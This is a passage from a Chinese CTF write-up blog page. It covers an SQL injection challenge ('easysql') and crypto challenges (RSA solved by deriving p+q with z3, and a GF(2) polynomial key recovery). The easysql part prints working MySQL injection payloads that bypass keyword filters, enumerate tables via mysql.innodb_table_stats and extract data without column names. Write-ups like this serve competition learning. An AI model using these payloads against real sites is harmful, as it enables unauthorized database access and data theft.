+<h4 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h4><p>手动测试了一下，过滤了,、and、or、union select，union select可用union all select绕过</p>
+<p>参考此篇文章进行bypass</p>
+<p><a href="https://drops.blbana.cc/2017/05/20/SQLi-——-逗号，空格，字段名过滤突破/#0x01-测试" target="_blank" rel="noopener">https://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/#0x01-%E6%B5%8B%E8%AF%95</a></p>
+<p>database：cccttffff</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&apos; union all select * from ((select 1)a join (select database())b join (select 3)c join (select 4)d)%23</span><br></pre></td></tr></table></figure>
+
+<p>由于information无法使用，因此使用<code>mysql.innodb_table_stats</code>代替<code>information_schema.tables</code></p>
+<p>table：article,fl111aa44a99g    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&apos; union all select * from ((select 1)a join (select database())b join (select 3)c join (select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())d)%23</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是无列名注入get flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&apos; union all select * from ((select 1)a join (select F.3 from (select * from (select 1)u join (select 2)i join (select 3)o union all select * from fl111aa44a99g limit 1 offset 1)F)b join (select 3)c join (select 4)d)%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/shanghai/1.png" alt></p>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>根据题目条件计算得到p+q</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">9538795663851271297602738029671089878718012242935213096566250130325046936720540247534143498025477544161347330379679111765871420732255741210434736423951962189227302658997497664520929375215715960063615792480965807127438948044298348300153102760490410578638259665656608784635088735809470916136628779400145983632930861883762707606629208260803446083579674497451514650309351925430391515629898218875049677870989016071086844819626778388370764400242376469343158294638240660190754978627356076115228410162956087266527271225439142347304100660800517276772407728290414074912243665126741030948775883739544952378188264714716087909797</span></span><br><span class="line">s1 = <span class="number">19077591327702542595205476059342179757436024485870426193132500260650093873441080495068286996050955088322694660759358223531742841464511482420869472847903924378454605317994995329041858750431431920127231584961931614254877896088596696600306205520980821157276519331313217569270177471618941832273257558800291967266057799408185825199394392306374394195697993019961311696247374832761757990150416392201444079060627610573918631913438062954960835929982836033906925917632413007648356037059843552967726871763559759125837289869091638924336309932526582201350695938677991368335828814565265478203873169858685929462350511138398905572292</span></span><br><span class="line">s2 = <span class="number">9538795663851271297602738029671089878718012242935213096566250130325046936720540247534143498025477544161347330379679111765871420732255741210434736423951962189227302658997497664520929375215715960063615792480965807127438948044298348300153102760490410578638259665656608784635088735809470916136628779400145983632930861883762707606629208260803446083579674497451514650309351925430391515629898218875049677870989016071086844819626778388370764400242376469343158294638240660190754978627356076115228410162956087266527271225439142347304100660800517276772407728290414074912243665126741030948775883739544952378188264714716087909797</span></span><br><span class="line"><span class="keyword">print</span> s1 * n / s2 - <span class="number">2</span> * n</span><br></pre></td></tr></table></figure>
+
+<p>p+q</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">196075640660409986135975784767502028538644025058282395628670981900974958890619954451344723318649578431744942274184506178219307129498083095220609328355931687266846079805131400737270051437647584592782747418213354229728108610925547647805880482097163218511341484311783416306321402379596024705973981708966729752698</span><br></pre></td></tr></table></figure>
+
+<p>通过z3求解方程即可算出p、q</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">p = Int(<span class="string">'p'</span>)</span><br><span class="line">q = Int(<span class="string">'q'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(p*q == <span class="number">9538795663851271297602738029671089878718012242935213096566250130325046936720540247534143498025477544161347330379679111765871420732255741210434736423951962189227302658997497664520929375215715960063615792480965807127438948044298348300153102760490410578638259665656608784635088735809470916136628779400145983632930861883762707606629208260803446083579674497451514650309351925430391515629898218875049677870989016071086844819626778388370764400242376469343158294638240660190754978627356076115228410162956087266527271225439142347304100660800517276772407728290414074912243665126741030948775883739544952378188264714716087909797</span>)</span><br><span class="line">s.add(p+q == <span class="number">196075640660409986135975784767502028538644025058282395628670981900974958890619954451344723318649578431744942274184506178219307129498083095220609328355931687266846079805131400737270051437647584592782747418213354229728108610925547647805880482097163218511341484311783416306321402379596024705973981708966729752698</span>)</span><br><span class="line">s.check()</span><br><span class="line">model = s.model()</span><br><span class="line"><span class="keyword">print</span> model</span><br></pre></td></tr></table></figure>
+
+<p>p</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89516168421901993249082527171566896585255089161654435795639393653714938085176717624166720396457043359717304975102306007578654871083121175803454922681698922194906414804214604517410856199189184886589639271288946105569496874593987805690922703821405554650664707364293232855974170175729835163792122422002418728851</span><br></pre></td></tr></table></figure>
+
+<p>q</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">106559472238507992886893257595935131953388935896627959833031588247260020805443236827178002922192535072027637299082200170640652258414961919417154405674232765071939665000916796219859195238458399706193108146924408124158611736331559842114957778275757663860676776947490183450347232203866189542181859286964311023847</span><br></pre></td></tr></table></figure>
+
+<p>通过pow(123,e,n)爆破e，得到e=251</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = <span class="number">89516168421901993249082527171566896585255089161654435795639393653714938085176717624166720396457043359717304975102306007578654871083121175803454922681698922194906414804214604517410856199189184886589639271288946105569496874593987805690922703821405554650664707364293232855974170175729835163792122422002418728851</span></span><br><span class="line">q = <span class="number">106559472238507992886893257595935131953388935896627959833031588247260020805443236827178002922192535072027637299082200170640652258414961919417154405674232765071939665000916796219859195238458399706193108146924408124158611736331559842114957778275757663860676776947490183450347232203866189542181859286964311023847</span></span><br><span class="line">c1 = <span class="number">368284101618076523549199130884422355928051525996327977632544904437878504262870825378516827225793010165434494157238379685995430409966951122729243411694569562164062815098110639750101378457641471316188502263725098231679401928494160942213175404259256770984218593245458108598930926260386443799301699336309331946341173652201791293571029025818674575198311845811957606474490230382511996537893448524426809391980637983473305318819523408854264623254226127223862150173575206444726570183096891630129244778802793476295746913846105454198627</span></span><br><span class="line">c = <span class="number">7303495910407762399046490836902121070389476875516762048462433039234972742941586801378979220008051262826174054961747648114128456872349675769941760630519744351742977740846748646739901172672743584989842268056810152117350241337045055812845489372389014195433916347255846499434232234822333192328886207187844781726928951986353054876826105507064928478812402103648940709131760865763234071703554208057808885564381400571862422316195578258814602362582573148358552148686182480215663291366798585241933446701357953551496955627421526567152576426417189707335038601040167826900549139608192971559659991213411381604721734898065256138516</span></span><br><span class="line">n = <span class="number">9538795663851271297602738029671089878718012242935213096566250130325046936720540247534143498025477544161347330379679111765871420732255741210434736423951962189227302658997497664520929375215715960063615792480965807127438948044298348300153102760490410578638259665656608784635088735809470916136628779400145983632930861883762707606629208260803446083579674497451514650309351925430391515629898218875049677870989016071086844819626778388370764400242376469343158294638240660190754978627356076115228410162956087266527271225439142347304100660800517276772407728290414074912243665126741030948775883739544952378188264714716087909797</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">251</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">flag = pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> (binascii.unhexlify(hex(flag)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># for i in range(1,1000):</span></span><br><span class="line"><span class="comment">#     c2 = pow(123,i,n)</span></span><br><span class="line"><span class="comment">#     if c2 == c1:</span></span><br><span class="line"><span class="comment">#         print i</span></span><br><span class="line"><span class="comment">#         break</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="poly"><a href="#poly" class="headerlink" title="poly"></a>poly</h4><p>通过多项式域上的二元一次方程恢复k1、k2，再通过一元一次方程求出msg0、msg1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">P=PolynomialRing(GF(<span class="number">2</span>),<span class="string">'x'</span>)</span><br><span class="line">F.&lt;x&gt; = GF(<span class="number">2</span>)[]</span><br><span class="line">pol = x**<span class="number">255</span>+ x**<span class="number">143</span>+ x**<span class="number">47</span> + x**<span class="number">3</span> + <span class="number">1</span></span><br><span class="line">FF = GF(<span class="number">2</span>**<span class="number">256</span>)</span><br><span class="line">r1 = <span class="number">0xbd94909c0e247c276ef6816797dd2b176337a430269f4f9df7ea14923a1a</span></span><br><span class="line">r2 = <span class="number">0xc1fef44fd4d870d00622e1f40779a2a83a64ab693c54780960b043d4d2ea</span></span><br><span class="line">c1 = <span class="number">0x0000bd94909c0e247c276ef6816797dd2b176337a430269f4f9df7ea14923a1a</span></span><br><span class="line">c2 = <span class="number">0x0000c1fef44fd4d870d00622e1f40779a2a83a64ab693c54780960b043d4d2ea</span></span><br><span class="line">m1 = <span class="number">0x0000476f6f6421546869735f69735f666c61673a666c61677b36303639636166</span></span><br><span class="line">m2 = <span class="number">0x0000362d303965312d343934612d626362352d6239346538663238383937317d</span></span><br><span class="line"><span class="comment"># get poly</span></span><br><span class="line">c1 = P(FF.fetch_int(c1))</span><br><span class="line">c2 = P(FF.fetch_int(c2))</span><br><span class="line">r1 = P(FF.fetch_int(r1))</span><br><span class="line">r2 = P(FF.fetch_int(r2))</span><br><span class="line">m1 = P(FF.fetch_int(m1))</span><br><span class="line">m2 = P(FF.fetch_int(m2))</span><br><span class="line"><span class="comment"># print c1</span></span><br><span class="line">k1 = (c1-c2)*inverse_mod(r1-r2,pol)</span><br><span class="line">k2 = c1-k1*r1</span><br><span class="line">msg0 = (m1-k2)*inverse_mod(k1,pol)%pol</span><br><span class="line">msg1 = (m2-k2)*inverse_mod(k1,pol)%pol</span><br><span class="line"><span class="comment"># get int</span></span><br><span class="line">msg0 = FF(msg0).integer_representation()</span><br><span class="line">msg1 = FF(msg1).integer_representation()</span><br><span class="line"><span class="keyword">print</span> msg0</span><br><span class="line"><span class="keyword">print</span> msg1</span><br><span class="line"><span class="keyword">print</span> binascii.a2b_hex(hex(msg0)[<span class="number">2</span>:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">print</span> binascii.a2b_hex(hex(msg1)[<span class="number">2</span>:<span class="number">-1</span>])</span><br></pre></td></tr></table></figure>
+
+<h4 id="poly-rev"><a href="#poly-rev" class="headerlink" title="poly_rev"></a>poly_rev</h4><p>跟poly一样</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/21/rsa之wilson定理/" rel="next" title="rsa之wilson定理">
+                <i class="fa fa-chevron-left"></i> rsa之wilson定理
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/09/2019湖湘杯/" rel="prev" title="2019湖湘杯">
+                2019湖湘杯 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Glarcy">
+            
+              <p class="site-author-name" itemprop="name">Glarcy</p>
+              <p class="site-description motion-element" itemprop="description">web小菜鸡</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io/" title="Twings" target="_blank">Twings</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xi4or0uji.github.io/" title="Xi4or0uji" target="_blank">Xi4or0uji</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://23r3f.github.io/" title="23R3F" target="_blank">23R3F</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://zszcr.github.io/" title="zs0zrc" target="_blank">zs0zrc</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Decade"><span class="nav-number">1.1.</span> <span class="nav-text">Decade</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Babyt5"><span class="nav-number">1.2.</span> <span class="nav-text">Babyt5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#easysql"><span class="nav-number">1.3.</span> <span class="nav-text">easysql</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RSA"><span class="nav-number">2.1.</span> <span class="nav-text">RSA</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#poly"><span class="nav-number">2.2.</span> <span class="nav-text">poly</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#poly-rev"><span class="nav-number">2.3.</span> <span class="nav-text">poly_rev</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Glarcy</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
